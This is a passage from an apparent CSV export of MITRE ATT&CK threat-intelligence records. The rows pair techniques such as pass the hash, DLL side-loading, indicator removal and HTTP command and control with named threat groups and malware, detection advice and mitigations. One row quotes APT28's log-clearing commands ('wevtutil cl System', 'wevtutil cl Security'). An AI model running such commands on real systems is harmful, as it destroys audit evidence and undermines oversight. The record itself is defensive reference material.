Microsoft Windows as target system'],[],['Lateral Movement'],['Technique/T1075'],['Pass the Hash'],https://attack.mitre.org/wiki/Technique/T1075
1328,['Audit all logon and credential use events and review for discrepancies. Unusual remote logins that correlate with other suspicious activity (such as writing and executing binaries) may indicate malicious activity. NTLM LogonType 3 authentications that are not associated to a domain login and are not anonymous logins are suspicious.'],[],[],[],['Authentication logs'],['[[Group/G0007|APT28]] has used pass the hash for lateral movement.[[CiteRef::Microsoft SIR Vol 19]]'],['APT28'],"['APT28', 'Sednit', 'Sofacy', 'Pawn Storm', 'Fancy Bear', 'STRONTIUM', 'Tsar Team', 'Threat Group-4127', 'TG-4127']",['G0007'],"[""Monitor systems and domain logs for unusual credential logon activity. Prevent access to [[Technique/T1078|Valid Accounts]]. Apply patch KB2871997 to Windows 7 and higher systems to limit the default access of accounts in the local administrator group. Limit credential overlap across systems to prevent the damage of credential compromise and reduce the adversary's ability to perform [[Lateral Movement]] between systems. Ensure that built-in and created local administrator accounts have complex, unique passwords. Do not allow a domain user to be in the local administrator group on multiple systems.""]","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",[],['Requires Microsoft Windows as target system'],[],['Lateral Movement'],['Technique/T1075'],['Pass the Hash'],https://attack.mitre.org/wiki/Technique/T1075
1329,['Audit all logon and credential use events and review for discrepancies. Unusual remote logins that correlate with other suspicious activity (such as writing and executing binaries) may indicate malicious activity. NTLM LogonType 3 authentications that are not associated to a domain login and are not anonymous logins are suspicious.'],[],[],[],['Authentication logs'],['[[Group/G0016|APT29]] used Kerberos ticket attacks for lateral movement.[[CiteRef::Mandiant No Easy Breach]]'],['APT29'],"['APT29', 'The Dukes', 'Cozy Bear']",['G0016'],"[""Monitor systems and domain logs for unusual credential logon activity. Prevent access to [[Technique/T1078|Valid Accounts]]. Apply patch KB2871997 to Windows 7 and higher systems to limit the default access of accounts in the local administrator group. Limit credential overlap across systems to prevent the damage of credential compromise and reduce the adversary's ability to perform [[Lateral Movement]] between systems. Ensure that built-in and created local administrator accounts have complex, unique passwords. Do not allow a domain user to be in the local administrator group on multiple systems.""]","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",[],['Requires Microsoft Windows as target system'],[],['Lateral Movement'],['Technique/T1075'],['Pass the Hash'],https://attack.mitre.org/wiki/Technique/T1075
1330,"['Detection methods will vary depending on the type of third-party software or system and how it is typically used. \n\nThe same investigation process can be applied here as with other potentially malicious activities where the distribution vector is initially unknown but the resulting activity follows a discernible pattern. Analyze the process execution trees, historical activities from the third-party application (such as what types of files are usually pushed), and the resulting activities or events from the file/binary/script pushed to systems. \n\nOften these third-party applications will have logs of their own that can be collected and correlated with other data from the environment. Audit software deployment logs and look for suspicious or unauthorized activity. A system not typically used to push software to clients that suddenly is used for such a task outside of a known admin function may be suspicious.\n\nPerform application deployment at regular times so that irregular deployment activity stands out. Monitor process activity that does not correlate to known good software. Monitor account login activity on the deployment system.']",[],[],[],"['Binary file metadata', 'File monitoring', 'Process monitoring', 'Process use of network', 'Third-party application logs', 'Windows Registry']","[""[[Group/G0028|Threat Group-1314]] actors used a victim's endpoint management platform, Altiris, for lateral movement.[[CiteRef::Dell TG-1314]]""]",['Threat Group-1314'],"['Threat Group-1314', 'TG-1314']",['G0028'],"['Evaluate the security of third-party software that could be used to deploy or execute programs. Ensure that access to management systems for deployment systems is limited, monitored, and secure. Have a strict approval policy for use of deployment systems.\n\nGrant access to application deployment systems only to a limited number of authorized administrators. Ensure proper system and access isolation for critical network systems through use of firewalls, account privilege separation, group policy, and multifactor authentication. Verify that account credentials that may be used to access deployment systems are unique and not used throughout the enterprise network. Patch deployment systems regularly to prevent potential remote access through [[Technique/T1068|Exploitation of Vulnerability]]. \n\nIf the application deployment system can be configured to deploy only signed binaries, then ensure that the trusted signing certificates are not co-located with the application deployment system and are instead located on a system that cannot be accessed remotely or to which remote access is tightly controlled.']","['Linux', 'MacOS', 'OS X', 'Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']","['Administrator', 'SYSTEM', 'User']",[],[],"['Execution', 'Lateral Movement']",['Technique/T1072'],['Third-party Software'],https://attack.mitre.org/wiki/Technique/T1072
1331,"['Monitor processes for unusual activity (e.g., a process that does not use the network begins to do so). Track DLL metadata, such as a hash, and compare DLLs that are loaded at process execution time against previous executions to detect differences that do not correlate with patching or updates.']","['Anti-virus', 'Process whitelisting']",[],[],"['Process use of network', 'Process monitoring', 'Loaded DLLs']","[""[[Software/S0074|Sakula]] uses DLL side-loading, typically using a digitally signed sample of Kaspersky Anti-Virus (AV) 6.0 for Windows Workstations or McAfee's Outlook Scan About Box to load malicious DLL files.[[CiteRef::Dell Sakula]]""]",['Deep Panda'],"['Deep Panda', 'Shell Crew', 'WebMasters', 'KungFu Kittens', 'PinkPanther', 'Black Vine']",['G0009'],['Update software regularly. Install software in write-protected locations. Use the program sxstrace.exe that is included with Windows along with manual inspection to check manifest files for side-loading vulnerabilities in software.'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",[],[],"Software: Sakula, Sakurel, VIPER",['Defense Evasion'],['Technique/T1073'],['DLL Side-Loading'],https://attack.mitre.org/wiki/Technique/T1073
1332,"['Monitor processes for unusual activity (e.g., a process that does not use the network begins to do so). Track DLL metadata, such as a hash, and compare DLLs that are loaded at process execution time against previous executions to detect differences that do not correlate with patching or updates.']","['Anti-virus', 'Process whitelisting']",[],[],"['Process use of network', 'Process monitoring', 'Loaded DLLs']",['[[Software/S0070|HTTPBrowser]] has used DLL side-loading.[[CiteRef::Dell TG-3390]]'],['APT18'],"['APT18', 'Threat Group-0416', 'TG-0416', 'Dynamite Panda']",['G0026'],['Update software regularly. Install software in write-protected locations. Use the program sxstrace.exe that is included with Windows along with manual inspection to check manifest files for side-loading vulnerabilities in software.'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",[],[],"Software: HTTPBrowser, Token Control, HttpDump",['Defense Evasion'],['Technique/T1073'],['DLL Side-Loading'],https://attack.mitre.org/wiki/Technique/T1073
1333,"['Monitor processes for unusual activity (e.g., a process that does not use the network begins to do so). Track DLL metadata, such as a hash, and compare DLLs that are loaded at process execution time against previous executions to detect differences that do not correlate with patching or updates.']","['Anti-virus', 'Process whitelisting']",[],[],"['Process use of network', 'Process monitoring', 'Loaded DLLs']",['[[Software/S0128|BADNEWS]] typically loads its DLL file into a legitimate signed Java executable.[[CiteRef::Forcepoint Monsoon]]'],['MONSOON'],"['MONSOON', 'Operation Hangover']",['G0042'],['Update software regularly. Install software in write-protected locations. Use the program sxstrace.exe that is included with Windows along with manual inspection to check manifest files for side-loading vulnerabilities in software.'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",[],[],Software: BADNEWS,['Defense Evasion'],['Technique/T1073'],['DLL Side-Loading'],https://attack.mitre.org/wiki/Technique/T1073
1334,"['Monitor processes for unusual activity (e.g., a process that does not use the network begins to do so). Track DLL metadata, such as a hash, and compare DLLs that are loaded at process execution time against previous executions to detect differences that do not correlate with patching or updates.']","['Anti-virus', 'Process whitelisting']",[],[],"['Process use of network', 'Process monitoring', 'Loaded DLLs']",['[[Software/S0013|PlugX]] has used to use DLL side-loading to evade anti-virus and to maintain persistence on a victim.[[CiteRef::Stewart 2014]][[CiteRef::FireEye Clandestine Fox Part 2]][[CiteRef::Dell TG-3390]][[CiteRef::PWC Cloud Hopper Technical Annex April 2017]][[CiteRef::Palo Alto PlugX June 2017]]'],['DragonOK'],['DragonOK'],['G0017'],['Update software regularly. Install software in write-protected locations. Use the program sxstrace.exe that is included with Windows along with manual inspection to check manifest files for side-loading vulnerabilities in software.'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",[],[],"Software: PlugX, Sogu, Kaba",['Defense Evasion'],['Technique/T1073'],['DLL Side-Loading'],https://attack.mitre.org/wiki/Technique/T1073
1335,"['Monitor processes for unusual activity (e.g., a process that does not use the network begins to do so). Track DLL metadata, such as a hash, and compare DLLs that are loaded at process execution time against previous executions to detect differences that do not correlate with patching or updates.']","['Anti-virus', 'Process whitelisting']",[],[],"['Process use of network', 'Process monitoring', 'Loaded DLLs']",['[[Software/S0013|PlugX]] has used to use DLL side-loading to evade anti-virus and to maintain persistence on a victim.[[CiteRef::Stewart 2014]][[CiteRef::FireEye Clandestine Fox Part 2]][[CiteRef::Dell TG-3390]][[CiteRef::PWC Cloud Hopper Technical Annex April 2017]][[CiteRef::Palo Alto PlugX June 2017]]'],['APT3'],"['APT3', 'Gothic Panda', 'Pirpi', 'UPS Team', 'Buckeye', 'Threat Group-0110', 'TG-0110']",['G0022'],['Update software regularly. Install software in write-protected locations. Use the program sxstrace.exe that is included with Windows along with manual inspection to check manifest files for side-loading vulnerabilities in software.'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",[],[],"Software: PlugX, Sogu, Kaba",['Defense Evasion'],['Technique/T1073'],['DLL Side-Loading'],https://attack.mitre.org/wiki/Technique/T1073
1336,"['Monitor processes for unusual activity (e.g., a process that does not use the network begins to do so). Track DLL metadata, such as a hash, and compare DLLs that are loaded at process execution time against previous executions to detect differences that do not correlate with patching or updates.']","['Anti-virus', 'Process whitelisting']",[],[],"['Process use of network', 'Process monitoring', 'Loaded DLLs']",['[[Software/S0013|PlugX]] has used to use DLL side-loading to evade anti-virus and to maintain persistence on a victim.[[CiteRef::Stewart 2014]][[CiteRef::FireEye Clandestine Fox Part 2]][[CiteRef::Dell TG-3390]][[CiteRef::PWC Cloud Hopper Technical Annex April 2017]][[CiteRef::Palo Alto PlugX June 2017]]'],['menuPass'],"['menuPass', 'Stone Panda', 'APT10', 'Red Apollo', 'CVNX']",['G0045'],['Update software regularly. Install software in write-protected locations. Use the program sxstrace.exe that is included with Windows along with manual inspection to check manifest files for side-loading vulnerabilities in software.'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",[],[],"Software: PlugX, Sogu, Kaba",['Defense Evasion'],['Technique/T1073'],['DLL Side-Loading'],https://attack.mitre.org/wiki/Technique/T1073
1337,"['Monitor processes for unusual activity (e.g., a process that does not use the network begins to do so). Track DLL metadata, such as a hash, and compare DLLs that are loaded at process execution time against previous executions to detect differences that do not correlate with patching or updates.']","['Anti-virus', 'Process whitelisting']",[],[],"['Process use of network', 'Process monitoring', 'Loaded DLLs']",['[[Group/G0045|menuPass]] has used DLL side-loading to launch versions of Mimikatz and PwDump6.[[CiteRef::PWC Cloud Hopper Technical Annex April 2017]]'],['menuPass'],"['menuPass', 'Stone Panda', 'APT10', 'Red Apollo', 'CVNX']",['G0045'],['Update software regularly. Install software in write-protected locations. Use the program sxstrace.exe that is included with Windows along with manual inspection to check manifest files for side-loading vulnerabilities in software.'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",[],[],[],['Defense Evasion'],['Technique/T1073'],['DLL Side-Loading'],https://attack.mitre.org/wiki/Technique/T1073
1338,"['Monitor processes for unusual activity (e.g., a process that does not use the network begins to do so). Track DLL metadata, such as a hash, and compare DLLs that are loaded at process execution time against previous executions to detect differences that do not correlate with patching or updates.']","['Anti-virus', 'Process whitelisting']",[],[],"['Process use of network', 'Process monitoring', 'Loaded DLLs']",['[[Software/S0013|PlugX]] has used to use DLL side-loading to evade anti-virus and to maintain persistence on a victim.[[CiteRef::Stewart 2014]][[CiteRef::FireEye Clandestine Fox Part 2]][[CiteRef::Dell TG-3390]][[CiteRef::PWC Cloud Hopper Technical Annex April 2017]][[CiteRef::Palo Alto PlugX June 2017]]'],['Threat Group-3390'],"['Threat Group-3390', 'TG-3390', 'Emissary Panda', 'BRONZE UNION']",['G0027'],['Update software regularly. Install software in write-protected locations. Use the program sxstrace.exe that is included with Windows along with manual inspection to check manifest files for side-loading vulnerabilities in software.'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",[],[],"Software: PlugX, Sogu, Kaba",['Defense Evasion'],['Technique/T1073'],['DLL Side-Loading'],https://attack.mitre.org/wiki/Technique/T1073
1339,"['Monitor processes for unusual activity (e.g., a process that does not use the network begins to do so). Track DLL metadata, such as a hash, and compare DLLs that are loaded at process execution time against previous executions to detect differences that do not correlate with patching or updates.']","['Anti-virus', 'Process whitelisting']",[],[],"['Process use of network', 'Process monitoring', 'Loaded DLLs']",['[[Software/S0070|HTTPBrowser]] has used DLL side-loading.[[CiteRef::Dell TG-3390]]'],['Threat Group-3390'],"['Threat Group-3390', 'TG-3390', 'Emissary Panda', 'BRONZE UNION']",['G0027'],['Update software regularly. Install software in write-protected locations. Use the program sxstrace.exe that is included with Windows along with manual inspection to check manifest files for side-loading vulnerabilities in software.'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",[],[],"Software: HTTPBrowser, Token Control, HttpDump",['Defense Evasion'],['Technique/T1073'],['DLL Side-Loading'],https://attack.mitre.org/wiki/Technique/T1073
1340,"['Monitor processes for unusual activity (e.g., a process that does not use the network begins to do so). Track DLL metadata, such as a hash, and compare DLLs that are loaded at process execution time against previous executions to detect differences that do not correlate with patching or updates.']","['Anti-virus', 'Process whitelisting']",[],[],"['Process use of network', 'Process monitoring', 'Loaded DLLs']",['[[Software/S0072|OwaAuth]] has been loaded onto Exchange servers and disguised as an ISAPI filter (DLL file). The IIS w3wp.exe process then loads the malicious DLL.[[CiteRef::Dell TG-3390]]'],['Threat Group-3390'],"['Threat Group-3390', 'TG-3390', 'Emissary Panda', 'BRONZE UNION']",['G0027'],['Update software regularly. Install software in write-protected locations. Use the program sxstrace.exe that is included with Windows along with manual inspection to check manifest files for side-loading vulnerabilities in software.'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",[],[],Software: OwaAuth,['Defense Evasion'],['Technique/T1073'],['DLL Side-Loading'],https://attack.mitre.org/wiki/Technique/T1073
1341,"['Monitor processes for unusual activity (e.g., a process that does not use the network begins to do so). Track DLL metadata, such as a hash, and compare DLLs that are loaded at process execution time against previous executions to detect differences that do not correlate with patching or updates.']","['Anti-virus', 'Process whitelisting']",[],[],"['Process use of network', 'Process monitoring', 'Loaded DLLs']",['[[Group/G0027|Threat Group-3390]] actors have used DLL side-loading. Actors have used legitimate Kaspersky anti-virus variants in which the DLL acts as a stub loader that loads and executes the shell code.[[CiteRef::Dell TG-3390]][[CiteRef::SecureWorks BRONZE UNION June 2017]]'],['Threat Group-3390'],"['Threat Group-3390', 'TG-3390', 'Emissary Panda', 'BRONZE UNION']",['G0027'],['Update software regularly. Install software in write-protected locations. Use the program sxstrace.exe that is included with Windows along with manual inspection to check manifest files for side-loading vulnerabilities in software.'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",[],[],[],['Defense Evasion'],['Technique/T1073'],['DLL Side-Loading'],https://attack.mitre.org/wiki/Technique/T1073
1342,['File system monitoring may be used to detect improper deletion or modification of indicator files. Events not stored on the file system will require different detection mechanisms.'],"['Anti-virus', 'Log analysis', 'Host intrusion prevention systems']",['93'],[],"['File monitoring', 'Process command-line parameters', 'Process monitoring']",['[[Software/S0032|gh0st]] RAT is able to wipe event logs.[[CiteRef::FireEye Hacking Team]]'],['PittyTiger'],['PittyTiger'],['G0011'],"['Automatically forward events to a log server or data repository to prevent conditions in which the adversary can locate and manipulate data on the local system. When possible, minimize time delay on event reporting to avoid prolonged storage on the local system. Protect generated event files that are stored locally with proper permissions and authentication. Obfuscate/encrypt event files locally and in transit to avoid giving feedback to an adversary.']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],Software: gh0st,['Defense Evasion'],['Technique/T1070'],['Indicator Removal on Host'],https://attack.mitre.org/wiki/Technique/T1070
1343,['File system monitoring may be used to detect improper deletion or modification of indicator files. Events not stored on the file system will require different detection mechanisms.'],"['Anti-virus', 'Log analysis', 'Host intrusion prevention systems']",['93'],[],"['File monitoring', 'Process command-line parameters', 'Process monitoring']",['[[Software/S0032|gh0st]] RAT is able to wipe event logs.[[CiteRef::FireEye Hacking Team]]'],['APT18'],"['APT18', 'Threat Group-0416', 'TG-0416', 'Dynamite Panda']",['G0026'],"['Automatically forward events to a log server or data repository to prevent conditions in which the adversary can locate and manipulate data on the local system. When possible, minimize time delay on event reporting to avoid prolonged storage on the local system. Protect generated event files that are stored locally with proper permissions and authentication. Obfuscate/encrypt event files locally and in transit to avoid giving feedback to an adversary.']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],Software: gh0st,['Defense Evasion'],['Technique/T1070'],['Indicator Removal on Host'],https://attack.mitre.org/wiki/Technique/T1070
1344,['File system monitoring may be used to detect improper deletion or modification of indicator files. Events not stored on the file system will require different detection mechanisms.'],"['Anti-virus', 'Log analysis', 'Host intrusion prevention systems']",['93'],[],"['File monitoring', 'Process command-line parameters', 'Process monitoring']",['[[Group/G0007|APT28]] has cleared event logs using the commands <code>wevtutil cl System</code> and <code>wevtutil cl Security</code>.[[CiteRef::Crowdstrike DNC June 2016]]'],['APT28'],"['APT28', 'Sednit', 'Sofacy', 'Pawn Storm', 'Fancy Bear', 'STRONTIUM', 'Tsar Team', 'Threat Group-4127', 'TG-4127']",['G0007'],"['Automatically forward events to a log server or data repository to prevent conditions in which the adversary can locate and manipulate data on the local system. When possible, minimize time delay on event reporting to avoid prolonged storage on the local system. Protect generated event files that are stored locally with proper permissions and authentication. Obfuscate/encrypt event files locally and in transit to avoid giving feedback to an adversary.']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],[],['Defense Evasion'],['Technique/T1070'],['Indicator Removal on Host'],https://attack.mitre.org/wiki/Technique/T1070
1345,['File system monitoring may be used to detect improper deletion or modification of indicator files. Events not stored on the file system will require different detection mechanisms.'],"['Anti-virus', 'Log analysis', 'Host intrusion prevention systems']",['93'],[],"['File monitoring', 'Process command-line parameters', 'Process monitoring']",['[[Software/S0148|RTM]] has the ability to remove Registry entries that it created during execution.[[CiteRef::ESET RTM Feb 2017]]'],['RTM'],['RTM'],['G0048'],"['Automatically forward events to a log server or data repository to prevent conditions in which the adversary can locate and manipulate data on the local system. When possible, minimize time delay on event reporting to avoid prolonged storage on the local system. Protect generated event files that are stored locally with proper permissions and authentication. Obfuscate/encrypt event files locally and in transit to avoid giving feedback to an adversary.']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],Software: RTM,['Defense Evasion'],['Technique/T1070'],['Indicator Removal on Host'],https://attack.mitre.org/wiki/Technique/T1070
1346,['File system monitoring may be used to detect improper deletion or modification of indicator files. Events not stored on the file system will require different detection mechanisms.'],"['Anti-virus', 'Log analysis', 'Host intrusion prevention systems']",['93'],[],"['File monitoring', 'Process command-line parameters', 'Process monitoring']",['The [[Software/S0089|BlackEnergy]] component KillDisk is capable of deleting Windows Event Logs.[[CiteRef::ESEST Black Energy Jan 2016]]'],['Sandworm Team'],"['Sandworm Team', 'Quedagh']",['G0034'],"['Automatically forward events to a log server or data repository to prevent conditions in which the adversary can locate and manipulate data on the local system. When possible, minimize time delay on event reporting to avoid prolonged storage on the local system. Protect generated event files that are stored locally with proper permissions and authentication. Obfuscate/encrypt event files locally and in transit to avoid giving feedback to an adversary.']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],"Software: BlackEnergy, Black Energy",['Defense Evasion'],['Technique/T1070'],['Indicator Removal on Host'],https://attack.mitre.org/wiki/Technique/T1070
1347,['File system monitoring may be used to detect improper deletion or modification of indicator files. Events not stored on the file system will require different detection mechanisms.'],"['Anti-virus', 'Log analysis', 'Host intrusion prevention systems']",['93'],[],"['File monitoring', 'Process command-line parameters', 'Process monitoring']",['[[Software/S0083|Misdat]] is capable of deleting Registry keys used for persistence.[[CiteRef::Cylance Dust Storm]]'],['Dust Storm'],['Dust Storm'],['G0031'],"['Automatically forward events to a log server or data repository to prevent conditions in which the adversary can locate and manipulate data on the local system. When possible, minimize time delay on event reporting to avoid prolonged storage on the local system. Protect generated event files that are stored locally with proper permissions and authentication. Obfuscate/encrypt event files locally and in transit to avoid giving feedback to an adversary.']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],Software: Misdat,['Defense Evasion'],['Technique/T1070'],['Indicator Removal on Host'],https://attack.mitre.org/wiki/Technique/T1070
1348,['File system monitoring may be used to detect improper deletion or modification of indicator files. Events not stored on the file system will require different detection mechanisms.'],"['Anti-virus', 'Log analysis', 'Host intrusion prevention systems']",['93'],[],"['File monitoring', 'Process command-line parameters', 'Process monitoring']","['[[Group/G0016|APT29]] used multiple versions of malware, and also minimized re-use of commonly-identified indicators like MD5s and C2s.[[CiteRef::Mandiant No Easy Breach]]']",['APT29'],"['APT29', 'The Dukes', 'Cozy Bear']",['G0016'],"['Automatically forward events to a log server or data repository to prevent conditions in which the adversary can locate and manipulate data on the local system. When possible, minimize time delay on event reporting to avoid prolonged storage on the local system. Protect generated event files that are stored locally with proper permissions and authentication. Obfuscate/encrypt event files locally and in transit to avoid giving feedback to an adversary.']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],[],['Defense Evasion'],['Technique/T1070'],['Indicator Removal on Host'],https://attack.mitre.org/wiki/Technique/T1070
1349,['File system monitoring may be used to detect improper deletion or modification of indicator files. Events not stored on the file system will require different detection mechanisms.'],"['Anti-virus', 'Log analysis', 'Host intrusion prevention systems']",['93'],[],"['File monitoring', 'Process command-line parameters', 'Process monitoring']",['[[Group/G0016|APT29]] used sdelete to remove artifacts from victims.[[CiteRef::Mandiant No Easy Breach]]'],['APT29'],"['APT29', 'The Dukes', 'Cozy Bear']",['G0016'],"['Automatically forward events to a log server or data repository to prevent conditions in which the adversary can locate and manipulate data on the local system. When possible, minimize time delay on event reporting to avoid prolonged storage on the local system. Protect generated event files that are stored locally with proper permissions and authentication. Obfuscate/encrypt event files locally and in transit to avoid giving feedback to an adversary.']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],[],['Defense Evasion'],['Technique/T1070'],['Indicator Removal on Host'],https://attack.mitre.org/wiki/Technique/T1070
1350,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious.  Analyze packet contents to detect application layer protocols that do not follow the expected protocol for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Process use of network', 'Malware reverse engineering', 'Process monitoring']",['[[Software/S0066|3PARA RAT]] uses HTTP for command and control.[[CiteRef::CrowdStrike Putter Panda]]'],['Putter Panda'],"['Putter Panda', 'APT2', 'MSUpdater']",['G0024'],['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and will be different across various malware families and versions. Adversaries will likely change tool signatures over time or construct protocols in such a way to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],Software: 3PARA RAT,['Command and Control'],['Technique/T1071'],['Standard Application Layer Protocol'],https://attack.mitre.org/wiki/Technique/T1071
1351,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious.  Analyze packet contents to detect application layer protocols that do not follow the expected protocol for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Process use of network', 'Malware reverse engineering', 'Process monitoring']",['[[Software/S0067|pngdowner]] uses HTTP for command and control.[[CiteRef::CrowdStrike Putter Panda]]'],['Putter Panda'],"['Putter Panda', 'APT2', 'MSUpdater']",['G0024'],['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and will be different across various malware families and versions. Adversaries will likely change tool signatures over time or construct protocols in such a way to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],Software: pngdowner,['Command and Control'],['Technique/T1071'],['Standard Application Layer Protocol'],https://attack.mitre.org/wiki/Technique/T1071
1352,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious.  Analyze packet contents to detect application layer protocols that do not follow the expected protocol for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Process use of network', 'Malware reverse engineering', 'Process monitoring']",['[[Software/S0068|httpclient]] uses HTTP for command and control.[[CiteRef::CrowdStrike Putter Panda]]'],['Putter Panda'],"['Putter Panda', 'APT2', 'MSUpdater']",['G0024'],['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and will be different across various malware families and versions. Adversaries will likely change tool signatures over time or construct protocols in such a way to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]'],"['Windows Server 2003', 'Windows Server 2008', 